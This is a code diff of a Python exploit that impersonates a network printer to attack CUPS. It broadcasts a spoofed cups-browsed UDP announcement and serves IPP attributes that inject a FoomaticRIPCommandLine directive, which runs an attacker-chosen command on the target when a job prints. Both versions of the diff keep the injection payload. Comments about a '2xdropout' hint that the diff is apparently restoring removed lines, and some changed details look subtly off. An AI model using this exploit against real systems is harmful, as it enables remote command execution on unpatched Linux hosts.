@@ -18,10 +18,8 @@ from ippserver.request import IppRequest
 
 
 class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in this class
-    def __init__(self, command, printerName, printerInfo):
+    def __init__(self, command):
         self.command = command
-        self.name = printerName
-        self.printerInfo = printerInfo
         super(MaliciousPrinter, self).__init__()
 
     def minimal_attributes(self):
@@ -53,7 +51,7 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
                 SectionEnum.printer,
                 b'uri-authentication-supported',
                 TagEnum.keyword
-                ): [b'none'],
+            ): [b'none'],
             (
                 SectionEnum.printer,
                 b'uri-security-supported',
@@ -63,12 +61,12 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
                 SectionEnum.printer,
                 b'printer-name',
                 TagEnum.name_without_language
-            ): [self.name.encode()],
+            ): [b'Main Printer'],
             (
                 SectionEnum.printer,
                 b'printer-info',
                 TagEnum.text_without_language
-            ): [self.printerInfo.encode()],
+            ): [b'Main Printer Info'],
             (
                 SectionEnum.printer,
                 b'printer-make-and-model',
@@ -96,12 +94,12 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
             ): [
                 Enum(x).bytes()
                 for x in (
-                OperationEnum.print_job, # (required by cups)
-                OperationEnum.validate_job, # (required by cups)
-                OperationEnum.cancel_job, # (required by cups)
-                OperationEnum.get_job_attributes, # (required by cups)
-                OperationEnum.get_printer_attributes,
-            )],
+                    OperationEnum.print_job, # (required by cups)
+                    OperationEnum.validate_job, # (required by cups)
+                    OperationEnum.cancel_job, # (required by cups)
+                    OperationEnum.get_job_attributes, # (required by cups)
+                    OperationEnum.get_printer_attributes,
+                )],
             (
                 SectionEnum.printer,
                 b'multiple-document-jobs-supported',
@@ -156,7 +154,7 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
                 SectionEnum.printer,
                 b'printer-up-time',
                 TagEnum.integer
-            ): [Integer(1234567).bytes()],
+            ): [Integer(self.printer_uptime()).bytes()],
             (
                 SectionEnum.printer,
                 b'compression-supported',
@@ -164,11 +162,11 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
             ): [b'none'],
             (
                 SectionEnum.printer,
-                b'printer-privacy-policy-uri',
+                b'printer-more-info',
                 TagEnum.uri
-            ): [b'https://www.google.com/"\nFoomaticRIPCommandLine:' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],  # The 2xdropout was on this line
+            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],  # The 2xdropout was in this block
         }
-        attr.update(self.minimal_attributes())
+        attr.update(super().minimal_attributes())
         return attr
 
     def operation_printer_list_response(self, req, _psfile):   # The 2xdropout was in this function
@@ -187,21 +185,12 @@ def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printerName,
 
     printer_type = 0x00
     printer_state = 0x03
-    printer_uri = 'http://%s:%d/printers/%s' % (
-        ipp_server_host, ipp_server_port, printerName
-    )
-
-    message = bytes('%x %x %s "%s" "%s"' % (
-        printer_type,
-        printer_state,
-        printer_uri,
-        printerLocation,
-        printerInfo), 'UTF-8'
-    )
+    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/{printerName}'
+    printer_model = 'Cannon TS6420a'
+    message = f'{printer_type} {printer_state} {printer_uri} {printerLocation} {printerInfo} {printer_model} \n'
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(message, (ip, port))
-
+    sock.sendto(message.encode('utf-8'), (ip, port))
 
 
 def wait_until_ctrl_c():
@@ -223,8 +212,7 @@ def run_server(server):
 
 def launch(RHOST, RPORT, SVRHOST, SVRPORT, printerName, printerLocation, printerInfo, command):   # The 2xdropout was in this function
 
-    server = IPPServer((SVRHOST, SVRPORT),
-    IPPRequestHandler, MaliciousPrinter(command, printerName, printerInfo))
+    server = IPPServer((SVRHOST, SVRPORT), IPPRequestHandler, MaliciousPrinter(command))
 
     threading.Thread(
         target=run_server,
